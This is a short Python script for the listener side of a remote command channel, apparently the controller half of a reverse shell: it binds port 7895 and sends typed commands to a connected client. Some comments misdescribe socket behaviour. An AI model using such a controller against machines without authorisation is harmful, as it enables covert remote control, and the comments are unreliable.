#this program is intended to run on a remote server and connect client
import socket #this is to create socket 
import sys    #this is to pass commands in the terminal

#Fuction to create a socket and connect computers

def build_socket():
    
    try:
        global host
        global port
        global s

        host = ""
        port = 7895

        s= socket.socket()

#as sometimes socket cant be created and that reason will be mentioned here

    except socket.error as err:     
        print("socket creation erroe was:" + str(err))


def connect_sockets(): #we have to connect port and host socket
    try:
        global host
        global port
        global s

        s.bind((host,port)) #this function connects the host and port with socket
        s.listen(6) #this function checks the connection and tolerates 6 bad connections




    except socket.error as msg:
        print("Error in binding host and port with socket was: "+str(msg),"\n","Reconnecting...")
        connect_sockets()

def accept_con(): #after binding socket to host and post and socket is listening then we can initiate this function
    conn,address=s.accept()
    print("The connection is established between IP:"+address[0]," |Port:"+str(address[1]))

    send_commands(conn)
    conn.close()


def send_commands(conn):   #this fuction sends commands to the client 
    while True:
        cmd=input()

        if cmd =='quit':    
            conn.close()
            s.close()
            sys.exit()
        
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")




    


    

